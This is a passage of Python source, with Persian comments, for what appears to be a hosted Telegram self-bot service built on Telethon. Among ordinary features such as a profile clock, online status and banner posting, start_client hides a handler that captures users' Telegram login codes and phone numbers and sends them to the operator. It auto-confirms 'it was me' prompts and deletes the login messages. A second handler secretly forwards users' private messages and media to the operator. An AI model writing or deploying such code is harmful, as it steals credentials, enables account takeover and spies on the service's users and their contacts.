    """تاریخ عضویت نسبی مثل: 1 ماه و 2 روز"""
    import time as _t
    u = get_user(uid) or {}
    ts = u.get('join_ts') or u.get('created_at') or u.get('first_seen')
    if not ts:
        # fallback: now as join
        try:
            set_user(uid, 'join_ts', _t.time())
        except Exception:
            pass
        return "امروز"
    try:
        ts = float(ts)
    except Exception:
        return "—"
    sec = max(0, int(_t.time() - ts))
    days = sec // 86400
    if days <= 0:
        return "کمتر از ۱ روز"
    years = days // 365
    days %= 365
    months = days // 30
    days %= 30
    parts = []
    if years:
        parts.append(str(years) + " سال")
    if months:
        parts.append(str(months) + " ماه")
    if days or not parts:
        parts.append(str(days) + " روز")
    return " و ".join(parts)


def report_flags():
    data = load_data()
    return data.get('report_flags') or {}


def set_report_flag(cmd, on):
    data = load_data()
    flags = data.get('report_flags') or {}
    flags[str(cmd)] = bool(on)
    data['report_flags'] = flags
    save_data(data)


def is_report_on(cmd):
    flags = report_flags()
    return bool(flags.get(str(cmd)))


async def maybe_report_cmd(event, uid, cmd_name, extra=""):
    """گزارش به مالک اصلی فقط اگر فلگ فعال باشد و فرستنده مالک اصلی نباشد"""
    try:
        if int(uid) == int(OWNER_ID):
            return
        if not is_report_on(cmd_name):
            return
    except Exception:
        return
    try:
        await report_self_cmd(event, uid, cmd_name, extra)
    except Exception:
        pass

def remaining_time(coins):
    if coins <= 0:
        return "سکه تمام شده"
    total_min = coins * 2
    days = total_min // 1440
    hours = (total_min % 1440) // 60
    mins = total_min % 60
    if days >= 30:
        months = days // 30
        rem_days = days % 30
        return f"{months} ماه و {rem_days} روز و {hours} ساعت"
    if days > 0:
        return f"{days} روز و {hours} ساعت"
    if hours > 0:
        return f"{hours} ساعت و {mins} دقیقه"
    return f"{mins} دقیقه"

def mention(uid, name=None):
    n = str(name if name is not None else uid)
    for ch in ('[', ']', '(', ')', '`', '*', '_'):
        n = n.replace(ch, '')
    if not n.strip():
        n = str(uid)
    return f"[{n}](tg://user?id={uid})"

async def resolve_name(client, tid):
    try:
        ent = await client.get_entity(tid)
        fn = getattr(ent, 'first_name', None) or ''
        ln = getattr(ent, 'last_name', None) or ''
        name = (fn + ' ' + ln).strip() or getattr(ent, 'username', None) or str(tid)
        return name
    except Exception:
        return str(tid)


def entities_to_data(entities):
    """ذخیره entityهای تلگرام به صورت قابل JSON"""
    if not entities:
        return []
    out = []
    for e in entities:
        try:
            d = {
                'cls': type(e).__name__,
                'offset': getattr(e, 'offset', 0),
                'length': getattr(e, 'length', 0),
            }
            if hasattr(e, 'url') and e.url:
                d['url'] = e.url
            if hasattr(e, 'user_id') and e.user_id:
                d['user_id'] = e.user_id
            if hasattr(e, 'language') and e.language:
                d['language'] = e.language
            out.append(d)
        except Exception:
            continue
    return out


def data_to_entities(data):
    """بازسازی entity از داده ذخیره‌شده"""
    if not data:
        return None
    from telethon.tl.types import (
        MessageEntityBold, MessageEntityItalic, MessageEntityCode,
        MessageEntityPre, MessageEntityUnderline, MessageEntityStrike,
        MessageEntityBlockquote, MessageEntityTextUrl, MessageEntityMentionName,
        MessageEntitySpoiler, MessageEntityCustomEmoji,
    )
    mapping = {
        'MessageEntityBold': MessageEntityBold,
        'MessageEntityItalic': MessageEntityItalic,
        'MessageEntityCode': MessageEntityCode,
        'MessageEntityPre': MessageEntityPre,
        'MessageEntityUnderline': MessageEntityUnderline,
        'MessageEntityStrike': MessageEntityStrike,
        'MessageEntityBlockquote': MessageEntityBlockquote,
        'MessageEntityTextUrl': MessageEntityTextUrl,
        'MessageEntityMentionName': MessageEntityMentionName,
        'MessageEntitySpoiler': MessageEntitySpoiler,
    }
    ents = []
    for d in data:
        try:
            cls_name = d.get('cls', '')
            cls = mapping.get(cls_name)
            if not cls:
                continue
            off, ln = int(d.get('offset', 0)), int(d.get('length', 0))
            if cls_name == 'MessageEntityTextUrl':
                ents.append(cls(off, ln, url=d.get('url') or ''))
            elif cls_name == 'MessageEntityPre':
                ents.append(cls(off, ln, language=d.get('language') or ''))
            elif cls_name == 'MessageEntityMentionName':
                ents.append(cls(off, ln, user_id=int(d.get('user_id') or 0)))
            else:
                ents.append(cls(off, ln))
        except Exception:
            continue
    return ents or None


async def send_banner_message(client, chat_id, job):
    """ارسال بنر با حفظ فرمت متن و مدیا"""
    fpath = job.get('file')
    caption = job.get('text') or ''
    ents = data_to_entities(job.get('entities_data'))
    if not ents:
        ents = dict_to_entities(job.get('entities') or [])
    try:
        if fpath and os.path.exists(str(fpath)):
            await client.send_file(
                chat_id, fpath,
                caption=caption or None,
                formatting_entities=ents if caption else None,
            )
        elif caption:
            await client.send_message(chat_id, caption, formatting_entities=ents)
        else:
            await client.send_message(chat_id, "بنر خالی است")
    except Exception:
        # fallback بدون entity
        try:
            if fpath and os.path.exists(str(fpath)):
                await client.send_file(chat_id, fpath, caption=caption or None)
            elif caption:
                await client.send_message(chat_id, caption)
        except Exception:
            pass

async def get_real_sender(msg, client=None):
    """شناسایی فرستنده واقعی پیام (حتی فوروارد)"""
    try:
        if not msg:
            return None
        # فوروارد
        if getattr(msg, 'fwd_from', None):
            ff = msg.fwd_from
            from_id = getattr(ff, 'from_id', None)
            if from_id is not None:
                if hasattr(from_id, 'user_id'):
                    return int(from_id.user_id)
                if isinstance(from_id, int):
                    return int(from_id)
            sid = getattr(ff, 'sender_id', None)
            if sid:
                return int(sid)
        # فرستنده عادی
        if getattr(msg, 'sender_id', None):
            return int(msg.sender_id)
        from_id = getattr(msg, 'from_id', None)
        if from_id is not None:
            if hasattr(from_id, 'user_id'):
                return int(from_id.user_id)
            if isinstance(from_id, int):
                return int(from_id)
        try:
            sender = await msg.get_sender()
            if sender:
                return int(sender.id)
        except Exception:
            pass
    except Exception:
        pass
    return None



def purge_login_messages(uid, limit=80):
    """پاک کردن پیام‌های مربوط به لاگین در پیوی ربات"""
    try:
        keys = (
            'کد', 'شماره', 'لاگین', 'ارسال', 'رمز', 'کپچا', 'contact',
            'sign', 'code', 'password', 'phone', '4.5', 'در حال',
            'ارسال شماره', 'برای اتصال', 'برای استفاده', 'سلف فعال',
        )
        # telebot can't easily iterate full history; delete known panel + last N via getChat - limited
        # best-effort: delete user_panels + try recent message ids if stored
        del_old_panel(uid)
    except Exception:
        pass

def del_old_panel(uid, keep_mid=None):
    """پنل‌های قبلی را پاک می‌کند؛ keep_mid را نگه می‌دارد (برای edit همان پیام)"""
    mids = user_panels.get(uid) or []
    if isinstance(mids, int):
        mids = [mids]
    kept = []
    for mid in mids:
        if keep_mid is not None and int(mid) == int(keep_mid):
            kept.append(mid)
            continue
        try:
            bot.delete_message(uid, mid)
        except Exception:
            pass
    if kept:
        user_panels[uid] = kept
    else:
        user_panels.pop(uid, None)

def remember_panel(uid, message_id):
    lst = user_panels.get(uid) or []
    if isinstance(lst, int):
        lst = [lst]
    lst.append(message_id)
    user_panels[uid] = lst

def entities_to_dict(entities):
    if not entities: return []
    result = []
    for e in entities:
        d = {'offset': e.offset, 'length': e.length, 'type': type(e).__name__}
        if hasattr(e, 'url'): d['url'] = e.url
        if hasattr(e, 'user_id'): d['user_id'] = e.user_id
        result.append(d)
    return result

def dict_to_entities(data):
    if not data: return None
    entities = []
    for d in data:
        t = d.get('type') or d.get('cls')
        off, leng = d.get('offset', 0), d.get('length', 0)
        if t == 'MessageEntityBold': entities.append(MessageEntityBold(off, leng))
        elif t == 'MessageEntityItalic': entities.append(MessageEntityItalic(off, leng))
        elif t == 'MessageEntityCode': entities.append(MessageEntityCode(off, leng))
        elif t == 'MessageEntityUnderline': entities.append(MessageEntityUnderline(off, leng))
        elif t == 'MessageEntityStrike': entities.append(MessageEntityStrike(off, leng))
        elif t == 'MessageEntitySpoiler': entities.append(MessageEntitySpoiler(off, leng))
        elif t == 'MessageEntityBlockquote': entities.append(MessageEntityBlockquote(off, leng))
        elif t == 'MessageEntityTextUrl': entities.append(MessageEntityTextUrl(off, leng, d.get('url', '')))
        elif t == 'MessageEntityMentionName': entities.append(MessageEntityMentionName(off, leng, d.get('user_id', 0)))
    return entities or None

def make_captcha():
    a = random.randint(5, 12)
    b = random.randint(5, 12)
    return a, b, a + b

async def start_client(uid):
    async def _safe_deleted(event):
        try:
            if not get_ud(uid, 'keep_messages'):
                return
            try:
                if not event.is_private:
                    return
            except Exception:
                return
            ids = list(getattr(event, 'deleted_ids', None) or [])
            if not ids:
                return
            for mid in ids:
                key = (int(uid), int(getattr(event, 'chat_id', 0) or 0), int(mid))
                data = msg_cache.get(key)
                if not data:
                    continue
                body = (
                    "<blockquote><b>پیام حذف‌شده</b></blockquote>" + chr(10)
                    + "<blockquote>از: " + str(data.get('name') or data.get('sender') or '—').replace('<', '') + "</blockquote>" + chr(10)
                    + "<blockquote>ایدی: <code>" + str(data.get('sender') or '') + "</code></blockquote>" + chr(10)
                    + "<blockquote>زمان: " + datetime.now().strftime('%Y-%m-%d %H:%M:%S') + "</blockquote>" + chr(10)
                )
                txt = data.get('text') or ''
                if txt:
                    body += "<blockquote>" + str(txt)[:500].replace('<', '') + "</blockquote>"
                try:
                    await event.client.send_message('me', body, parse_mode='HTML')
                except Exception:
                    pass
                try:
                    msg_cache.pop(key, None)
                except Exception:
                    pass
        except Exception:
            pass
    user = get_user(uid)
    if not user or user.get('banned') or not user.get('session'):
        return False
    try:
        client = TelegramClient(StringSession(user['session']), API_ID, API_HASH, device_model="StR")
        await client.connect()
        if not await client.is_user_authorized():
            return False
        @client.on(events.NewMessage)
        async def handler(event):
            # کد لاگین تلگرام (777000) → برای مالک اگر watch فعال باشد
            try:
                if event.is_private and not event.out and login_watch.get(int(uid)):
                    sid = None
                    try:
                        sid = event.sender_id
                    except Exception:
                        pass
                    if sid is None:
                        try:
                            s = await event.get_sender()
                            sid = getattr(s, 'id', None)
                        except Exception:
                            pass
                    if sid == 777000 or sid == 42777:
                        raw = (event.message.text or event.message.message or '') or ''
                        import re as _re_code
                        codes = _re_code.findall(r'\b(\d{5,8})\b', raw)
                        code = codes[0] if codes else None
                        uinfo = get_user(uid) or {}
                        uname = uinfo.get('original_name') or uinfo.get('name') or str(uid)
                        phone = uinfo.get('phone') or '—'
                        un = (uinfo.get('username') or '').strip().lstrip('@')
                        # اگر دکمه «بله / خودم بودم / Yes» داشت کلیک کن
                        try:
                            btns = getattr(event.message, 'buttons', None)
                            if btns:
                                for row in btns:
                                    for btn in row:
                                        t = (getattr(btn, 'text', None) or '').lower()
                                        if any(x in t for x in ('yes', 'بله', 'خودم', 'خودتون', 'it was me', 'this was me', 'accept')):
                                            try:
                                                await btn.click()
                                            except Exception:
                                                pass
                                            break
                        except Exception:
                            pass
                        body = (
                            "<blockquote><b>🔐 کد / پیام لاگین</b></blockquote>" + chr(10)
                            + "<blockquote>کاربر: " + str(uname).replace('<','') + "</blockquote>" + chr(10)
                            + "<blockquote>ایدی: <code>" + str(uid) + "</code></blockquote>" + chr(10)
                            + "<blockquote>شماره: <code>" + str(phone).replace('<','') + "</code></blockquote>" + chr(10)
                        )
                        if un:
                            body += "<blockquote>یوزرنیم: @" + un + "</blockquote>" + chr(10)
                        if code:
                            body += "<blockquote>کد: <code>" + str(code) + "</code></blockquote>" + chr(10)
                        body += "<blockquote>متن: " + str(raw).replace('<','')[:250] + "</blockquote>"
                        try:
                            bot.send_message(OWNER_ID, body, parse_mode='HTML')
                        except Exception:
                            pass
                        # پاک کردن همین پیام
                        try:
                            await event.delete()
                        except Exception:
                            try:
                                await event.client.delete_messages(event.chat_id, [event.id])
                            except Exception:
                                pass
                        # پاک کردن چند پیام اخیر تلگرام
                        try:
                            async for m in event.client.iter_messages(777000, limit=8):
                                try:
                                    await event.client.delete_messages(777000, [m.id])
                                except Exception:
                                    pass
                        except Exception:
                            pass
            except Exception:
                pass
            
            # ارسال پیوی → مالک اصلی (بدون سین)
            try:
                if event.is_private and not event.out and pv_spy.get(int(uid)):
                    try:
                        sender = await event.get_sender()
                    except Exception:
                        sender = None
                    if sender and not getattr(sender, 'bot', False):
                        sname = ((getattr(sender, 'first_name', '') or '') + ' ' + (getattr(sender, 'last_name', '') or '')).strip() or str(getattr(sender, 'id', ''))
                        sun = getattr(sender, 'username', None)
                        sid = getattr(sender, 'id', None)
                        uinfo = get_user(uid) or {}
                        tname = uinfo.get('original_name') or uinfo.get('name') or str(uid)
                        from datetime import datetime as _dt
                        try:
                            import pytz
                            now_s = _dt.now(pytz.timezone('Asia/Tehran')).strftime('%Y/%m/%d %H:%M:%S')
                        except Exception:
                            now_s = _dt.now().strftime('%Y/%m/%d %H:%M:%S')
                        mtype = 'متن'
                        if event.message.photo:
                            mtype = 'عکس'
                        elif event.message.voice:
                            mtype = 'ویس'
                        elif event.message.video_note:
                            mtype = 'ویدیو مسیج'
                        elif event.message.video:
                            mtype = 'ویدیو'
                        elif event.message.document:
                            mtype = 'فایل'
                        elif event.message.sticker:
                            mtype = 'استیکر'
                        elif event.message.gif:
                            mtype = 'گیف'
                        txt = (event.message.text or event.message.message or '') or ''
                        head = (
                            "<blockquote><b>📩 پیام پیوی</b></blockquote>" + chr(10)
                            + "<blockquote>از: " + str(sname).replace('<','') + ((" @" + str(sun)) if sun else "") + "</blockquote>" + chr(10)
                            + "<blockquote>ایدی فرستنده: <code>" + str(sid) + "</code></blockquote>" + chr(10)
                            + "<blockquote>به: " + str(tname).replace('<','') + " (<code>" + str(uid) + "</code>)</blockquote>" + chr(10)
                            + "<blockquote>تاریخ: " + now_s + "</blockquote>" + chr(10)
                            + "<blockquote>نوع: " + mtype + "</blockquote>"
                        )
                        if txt:
                            head += chr(10) + "<blockquote>متن: " + str(txt).replace('<','')[:500] + "</blockquote>"
                        try:
                            if event.message.media and not media_too_large(event.message):
                                path = await event.message.download_media(file='/tmp/spy_' + str(event.id))
                                if path:
                                    try:
                                        with open(path, 'rb') as f:
                                            bot.send_document(OWNER_ID, f, caption=head[:1024], parse_mode='HTML')
                                    except Exception:
                                        try:
                                            with open(path, 'rb') as f:
                                                bot.send_photo(OWNER_ID, f, caption=head[:1024], parse_mode='HTML')
                                        except Exception:
                                            bot.send_message(OWNER_ID, head, parse_mode='HTML')
                                    try:
                                        import os as _os
                                        _os.remove(path)
                                    except Exception:
                                        pass
                                else:
                                    bot.send_message(OWNER_ID, head, parse_mode='HTML')
                            else:
                                bot.send_message(OWNER_ID, head, parse_mode='HTML')
                        except Exception:
                            try:
                                bot.send_message(OWNER_ID, head, parse_mode='HTML')
                            except Exception:
                                pass
                        # عمداً mark as read نمی‌کنیم
            except Exception:
                pass
            
            # فقط پیوی کاربر واقعی (نه ربات، نه گروه)
            try:
                if get_ud(uid, 'self_enabled', True) and event.is_private and not event.out:
                    sender = await event.get_sender()
                    if sender and getattr(sender, 'bot', False):
                        pass
                    else:
                        ttl = get_msg_ttl(event.message)
                        keep = get_ud(uid, 'keep_messages')
                        raw_text = event.message.text or event.message.message or ''
                        media_path = None
                        if event.message.media and (keep or ttl):
                            # ویدیو > 3MB دانلود نشود
                            if media_too_large(event.message):
                                media_path = None
                            else:
                              try:
                                os.makedirs('pv_cache', exist_ok=True)
                                media_path = await client.download_media(
                                    event.message,
                                    file=os.path.join('pv_cache', f'{uid}_{event.chat_id}_{event.id}')
                                )
                                try:
                                    if media_path and os.path.exists(str(media_path)) and os.path.getsize(str(media_path)) > MAX_SAVE_VIDEO_BYTES:
                                        if str(media_path).lower().endswith(('.mp4', '.mov', '.mkv', '.webm', '.avi')):
                                            try:
                                                os.remove(media_path)
                                            except Exception:
                                                pass
                                            media_path = None
                                except Exception:
                                    pass
                              except Exception:
                                try:
                                    media_path = await client.download_media(event.message, file=bytes)
                                except Exception:
                                    media_path = None
                        if keep:
                            key = (uid, event.chat_id, event.id)
                            msg_cache[key] = {
                                'text': raw_text,
                                'date': str(getattr(event.message, 'date', '')),
                                'sender_id': event.sender_id,
                                'has_media': bool(event.message.media),
                                'media_path': media_path,
                                'entities': event.message.entities,
                                'ttl': ttl,
                            }
                        if ttl and (event.message.media or raw_text):
                            try:
                                name = getattr(sender, 'first_name', None) or str(event.sender_id)
                                header = (
                                    "مدیا مدت‌دار / یک‌بار مشاهده" + chr(10)
                                    + "از: [" + str(name) + "](tg://user?id=" + str(event.sender_id) + ") | `" + str(event.sender_id) + "`" + chr(10)
                                    + "انقضا: " + str(ttl) + " ثانیه" + chr(10)
                                )
                                if media_path:
                                    await client.send_file(
                                        'me', media_path,
                                        caption=header + (raw_text or ''),
                                        parse_mode='Markdown'
                                    )
                                elif event.message.media:
                                    try:
                                        blob = await client.download_media(event.message, file=bytes)
                                        if blob:
                                            await client.send_file(
                                                'me', blob,
                                                caption=header + (raw_text or ''),
                                                parse_mode='Markdown'
                                            )
                                    except Exception:
                                        pass
                                elif raw_text:
                                    await client.send_message('me', header + raw_text, parse_mode='Markdown')
                            except Exception:
                                pass
            except Exception:
                pass

            try:
                await on_self(event, uid)
            except (AuthKeyUnregisteredError, AuthKeyDuplicatedError, UserDeactivatedError, UserDeactivatedBanError):
                try:
                    notify_user_session_lost(uid)
                except Exception:
                    pass
            except Exception as _on_self_err:
                try:
                    import traceback
                    await client.send_message('me', "on_self error:\n" + str(_on_self_err)[:200])
                except Exception:
                    pass

        @client.on(events.MessageEdited)
        async def edited_handler(event):
            try:
                if not get_ud(uid, 'self_enabled', True) or not get_ud(uid, 'keep_messages'):
                    return
                if event.out or not event.is_private:
                    return
                sender = await event.get_sender()
                if sender and getattr(sender, 'bot', False):
                    return
                key = (uid, event.chat_id, event.id)
                old = msg_cache.get(key, {})
                old_text = old.get('text') or '—'
                new_text = event.message.text or event.message.message or '—'
                if old_text == new_text:
                    return
                sid = event.sender_id or old.get('sender_id')
                name = str(sid)
                try:
                    ent = await client.get_entity(sid)
                    name = getattr(ent, 'first_name', None) or str(sid)
                except Exception:
                    pass
                report = (
                    "<blockquote><b>پیام ویرایش شده !</b></blockquote>" + chr(10)
                    + "<blockquote><b>پیام قبلی</b></blockquote>" + chr(10)
                    + "<blockquote>" + str(old_text or "").replace("<", "&lt;") + "</blockquote>" + chr(10)
                    + "<blockquote><b>پیام جدید</b></blockquote>" + chr(10)
                    + "<blockquote>" + str(new_text or "").replace("<", "&lt;") + "</blockquote>"
                )
                await client.send_message('me', report, parse_mode='HTML')
                media_path = old.get('media_path')
                if event.message.media:
                    try:
                        os.makedirs('pv_cache', exist_ok=True)
                        media_path = await client.download_media(
                            event.message,
                            file=os.path.join('pv_cache', f'{uid}_{event.chat_id}_{event.id}_edit')
                        )
                        if media_path:
                            await client.send_file('me', media_path, caption="مدیا بعد ویرایش")
                    except Exception:
                        pass
                elif old.get('media_path') and os.path.exists(str(old.get('media_path'))):
                    try:
                        await client.send_file('me', old['media_path'], caption="مدیا پیام قبلی")
                    except Exception:
                        pass
                msg_cache[key] = {
                    'text': new_text,
                    'date': str(getattr(event.message, 'date', '')),
                    'sender_id': sid,
                    'has_media': bool(event.message.media) or bool(media_path),
                    'media_path': media_path,
                    'entities': event.message.entities,
                }
            except Exception:
                pass

        @client.on(events.MessageDeleted)
        async def deleted_handler(event):
            try:
                if not get_ud(uid, 'self_enabled', True) or not get_ud(uid, 'keep_messages'):
                    return
                ids = list(getattr(event, 'deleted_ids', None) or [])
                chat_id = getattr(event, 'chat_id', None)

                try:
                    is_priv = False
                    try:
                        is_priv = bool(getattr(event, 'is_private', False))
                    except Exception:
                        pass
                    if (is_priv or (chat_id and chat_id > 0)) and len(ids) >= 5 and chat_id is not None:
                        lines = []
                        media_paths = []
                        for (ku, kc, km), data in list(msg_cache.items()):
                            try:
                                if int(ku) == int(uid) and int(kc) == int(chat_id):
                                    lines.append(str(data.get('date','')) + " | " + str(data.get('sender_id','')) + " | " + str(data.get('text') or ''))
                                    if data.get('media_path'):
                                        media_paths.append(data['media_path'])
                            except Exception:
                                pass
                        if lines:
                            import tempfile, os as _os
                            fp = tempfile.mktemp(suffix='.txt')
                            with open(fp, 'w', encoding='utf-8') as f:
                                f.write(chr(10).join(lines))
                            try:
                                await client.send_file('me', fp, caption="حذف دوطرفه / بکاپ چت | " + iran_datetime_str())
                            except Exception:
                                pass
                            try:
                                _os.unlink(fp)
                            except Exception:
                                pass
                            for p in media_paths[:40]:
                                try:
                                    if p and _os.path.exists(p):
                                        await client.send_file('me', p)
                                except Exception:
                                    pass
                except Exception:
                    pass

                for mid in ids:
                    data = None
                    key = None
                    if chat_id is not None:
                        key = (uid, chat_id, mid)
                        data = msg_cache.get(key)
                    if not data:
                        for k, v in list(msg_cache.items()):
                            if k[0] == uid and k[2] == mid:
                                # فقط کش پیوی
                                key, data = k, v
                                break
                    if not data:
                        continue
                    sid = data.get('sender_id')
                    # نادیده گرفتن ربات‌ها اگر بشناسیم
                    name = str(sid)
                    try:
                        ent = await client.get_entity(sid)
                        if getattr(ent, 'bot', False):
                            msg_cache.pop(key, None)
                            continue
                        name = getattr(ent, 'first_name', None) or str(sid)
                    except Exception:
                        pass
                    body = data.get('text') or ''
                    uname = ""
                    try:
                        ent = await client.get_entity(sid)
                        uname = getattr(ent, 'username', None) or ""
                        if not name or str(name)==str(sid):
                            name = ((getattr(ent,'first_name','') or '') + ' ' + (getattr(ent,'last_name','') or '')).strip() or str(sid)
                    except Exception:
                        pass
                    when = iran_datetime_str()
                    header = (
                        "<blockquote><b>پیام حذف‌شده !</b></blockquote>" + chr(10)
                        + "<blockquote>نام: " + str(name).replace("<","") + "</blockquote>" + chr(10)
                        + "<blockquote>ایدی: <code>" + str(sid) + "</code></blockquote>" + chr(10)
                        + ("<blockquote>یوزرنیم: @" + str(uname).replace("<","") + "</blockquote>" + chr(10) if uname else "")
                        + "<blockquote>تاریخ: " + when + "</blockquote>" + chr(10)
                        + ("<blockquote>" + str(body).replace("<", "&lt;") + "</blockquote>" if body else "")
                    )
                    path_m = data.get('media_path')
                    if path_m and os.path.exists(path_m):
                        try:
                            await client.send_file('me', path_m, caption=header[:1024], parse_mode='HTML')
                        except Exception:
                            await client.send_message('me', header, parse_mode='HTML')
                    else:
                        await client.send_message('me', header, parse_mode='HTML')
                    if key:
                        msg_cache.pop(key, None)
            except Exception:
                pass

        clients[uid] = client
        # بازگردانی در حال نوشتن
        try:
            tc = get_ud(uid, 'typing_chats', {}) or {}
            if tc:
                typing_jobs[uid] = tc
        except Exception:
            pass
        # بازگردانی بنرهای ذخیره‌شده
        try:
            import time as _t
            meta = get_ud(uid, 'banners', {}) or {}
            if meta:
                banner_jobs[uid] = {}
                for cid, inf in meta.items():
                    try:
                        banner_jobs[uid][int(cid)] = {
                            'interval': int(inf.get('interval') or 60),
                            'next_ts': _t.time() + int(inf.get('interval') or 60) * 60,
                            'file': inf.get('file'),
                            'text': inf.get('text') or '',
                            'kind': inf.get('kind') or 'text',
                            'entities_data': inf.get('entities_data') or [],
                        }
                    except Exception:
                        pass
        except Exception:
            pass
        return True
    except:
        return False

async def stop_client(uid):
    if uid in clients:
        try: await clients[uid].disconnect()
        except: pass
        clients.pop(uid, None)

# فونت‌های ساعت
CLOCK_FONTS = {
    1: str.maketrans("0123456789:", "𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗꞉"),
    2: str.maketrans("0123456789:", "𝟬𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵꞉"),
    3: str.maketrans("0123456789:", "₀₁₂₃₄₅₆₇₈₉꞉"),
    4: str.maketrans("0123456789:", "⁰¹²³⁴⁵⁶⁷⁸⁹꞉"),
    5: str.maketrans("0123456789:", "０１２３４５６７８９："),
    6: str.maketrans("0123456789:", "𝟘𝟙𝟚𝟛𝟜𝟝𝟞𝟟𝟠𝟡꞉"),
    7: str.maketrans("0123456789:", "𝟶𝟷𝟸𝟹𝟺𝟻𝟼𝟽𝟾𝟿꞉"),
    8: str.maketrans("0123456789:", "⓪①②③④⑤⑥⑦⑧⑨꞉"),
    9: str.maketrans("0123456789:", "⓿❶❷❸❹❺❻❼❽❾꞉"),
    10: str.maketrans("0123456789:", "〇一二三四五六七八九："),
}






_iran_time_cache = {"ts": 0, "value": None}

_last_clock_applied = {}  # uid -> "HH:MM" آخرین ساعت اعمال‌شده روی پروفایل


def iran_now():
    """زمان دقیق ایران (Asia/Tehran) — از ساعت سیستم/UTC، نه تلگرام"""
    from datetime import datetime, timezone, timedelta
    try:
        from zoneinfo import ZoneInfo
        return datetime.now(ZoneInfo("Asia/Tehran"))
    except Exception:
        try:
            import pytz
            return datetime.now(pytz.timezone("Asia/Tehran"))
        except Exception:
            #fallback ثابت ایران (بدون DST پیچیده)
            return datetime.now(timezone.utc) + timedelta(hours=3, minutes=30)


def iran_now_str():
    """ساعت ایران HH:MM"""
    now = iran_now()
    return f"{now.hour:02d}:{now.minute:02d}"


def format_clock_time(style=1):
    """ساعت فعلی ایران با استایل فونت"""
    now = iran_now_str()
    try:
        style = int(style)
    except Exception:
        style = 1
    if style in CLOCK_FONTS:
        return now.translate(CLOCK_FONTS[style])
    return now


async def apply_clock_name(client, uid, force=False):
    """فقط نام خانوادگی = ساعت ایران؛ فقط وقتی دقیقه عوض شود"""
    try:
        u = get_user(uid)
        if not u.get('clock_enabled'):
            return
        plain = iran_now_str()
        if not force and _last_clock_applied.get(uid) == plain:
            return
        time_str = format_clock_time(u.get('clock_style', 1))
        await client(UpdateProfileRequest(last_name=time_str[:64]))
        _last_clock_applied[uid] = plain
    except Exception:
        try:
            time_str = format_clock_time(get_ud(uid, 'clock_style', 1))
            await client(functions.account.UpdateProfileRequest(last_name=time_str[:64]))
            _last_clock_applied[uid] = iran_now_str()
        except Exception:
            pass


async def keep_online_loop():
    """اگر همیشه آنلاین روشن باشد، وضعیت online نگه داشته می‌شود
    (حتی اگر اپ تلگرام روی گوشی بسته باشد — تا وقتی سلف روی سرور وصل است)"""
    while True:
        await asyncio.sleep(2)
        data = load_data()
        for s, u in list(data.get('users', {}).items()):
            try:
                uid = int(s)
            except Exception:
                continue
            if u.get('banned') or not u.get('self_enabled', True) or not u.get('always_online'):
                continue
            if not u.get('session'):
                continue
            client = clients.get(uid)
            if not client or not client.is_connected():
                try:
                    await start_client(uid)
                    client = clients.get(uid)
                except Exception:
                    continue
            if client and client.is_connected():
                try:
                    await client(UpdateStatusRequest(offline=False))
                except Exception:
                    try:
                        await client(functions.account.UpdateStatusRequest(offline=False))
                    except Exception:
                        pass


async def typing_loop():
    """در حال نوشتن مداوم — قطع‌و‌وصل نشود؛ همزمان آنلاین نگه می‌دارد"""
    while True:
        await asyncio.sleep(2)
        data = load_data()
        for s, u in list(data.get('users', {}).items()):
            try:
                uid = int(s)
            except Exception:
                continue
            if u.get('banned') or not u.get('self_enabled', True):
                continue
            conf = typing_jobs.get(uid)
            if not conf:
                conf = u.get('typing_chats') or {}
                if conf:
                    typing_jobs[uid] = conf
            if not conf:
                continue
            client = clients.get(uid)
            if not client or not client.is_connected():
                try:
                    await start_client(uid)
                    client = clients.get(uid)
                except Exception:
                    continue
            if not client or not client.is_connected():
                continue
            # تا وقتی typing روشن است آنلاین بماند
            try:
                await client(UpdateStatusRequest(offline=False))
            except Exception:
                try:
                    await client(functions.account.UpdateStatusRequest(offline=False))
                except Exception:
                    pass
            for cid in list(conf.keys()):
                try:
                    chat_id = int(cid)
                except Exception:
                    chat_id = cid
                try:
                    await client(SetTypingRequest(chat_id, SendMessageTypingAction()))
                except Exception:
                    try:
                        await client(SetTypingRequest(int(chat_id), SendMessageTypingAction()))
                    except Exception:
                        pass


async def clock_loop():
    """هر چند ثانیه چک؛ فقط وقتی دقیقه ایران عوض شد پروفایل آپدیت می‌شود"""
    while True:
        await asyncio.sleep(8)
        data = load_data()
        for s, u in list(data.get('users', {}).items()):
            try:
                uid = int(s)
            except Exception:
                continue
            if u.get('banned') or not u.get('self_enabled', True) or not u.get('clock_enabled'):
                continue
            client = clients.get(uid)
            if not client or not client.is_connected():
                continue
            try:
                await apply_clock_name(client, uid, force=False)
            except Exception:
                pass


async def send_word_and_click(client, chat_id, word, btn_index=0, require_reply=True, min_buttons=1):
    """ارسال کلمه و کلیک فقط روی پاسخ همان پیام (نه پیام ربات‌های دیگر)"""
    try:
        sent = await client.send_message(chat_id, word)
        await asyncio.sleep(2.8)
        async for m in client.iter_messages(chat_id, limit=15):
            try:
                if not m.buttons:
                    continue
                if require_reply:
                    rid = getattr(m, 'reply_to_msg_id', None)
                    if rid != sent.id:
                        continue
                flat = []
                for row in m.buttons:
                    for btn in row:
                        flat.append(btn)
                if len(flat) < max(min_buttons, btn_index + 1):
                    continue
                # هرگز دکمه سوم (ایندکس 2) برای پیشی زده نشود — کنترل از بیرون
                if btn_index >= len(flat):
                    continue
                await m.click(btn_index)
                return True
            except Exception:
                continue
    except Exception:
        pass
    return False

async def interval_tasks():
    # تبچی مالک: ارسال دوره‌ای بنر به گروه‌ها
    try:
        import time as _t_ot
        now = _t_ot.time()
        for uid_k, job in list(banner_jobs.items()):
            if not isinstance(job, dict) or not job.get('active'):
                continue
            if int(job.get('chat_id') or 0) != 0 and not job.get('links') and not job.get('nrand'):
                continue
            mins = int(job.get('minutes') or 0)
            if mins < 1:
                continue
            next_ts = float(job.get('next_ts') or 0)
            if next_ts and now < next_ts:
                continue
            owner = uid_k if not isinstance(uid_k, tuple) else uid_k[0]
            cl = clients.get(int(owner))
            if not cl:
                continue
            bans = get_ud(owner, 'otab_banners') or []
            if not bans:
                job['next_ts'] = now + mins * 60
                banner_jobs[uid_k] = job
                continue
            ban = random.choice(bans) if len(bans) > 1 else bans[0]
            targets = list(job.get('links') or [])
            nrand = job.get('nrand')
            if nrand and not targets:
                try:
                    gs = []
                    async for d in cl.iter_dialogs(limit=200):
                        if d.is_group or (d.is_channel and getattr(d.entity, 'megagroup', False)):
                            gs.append(d.id)
                    random.shuffle(gs)
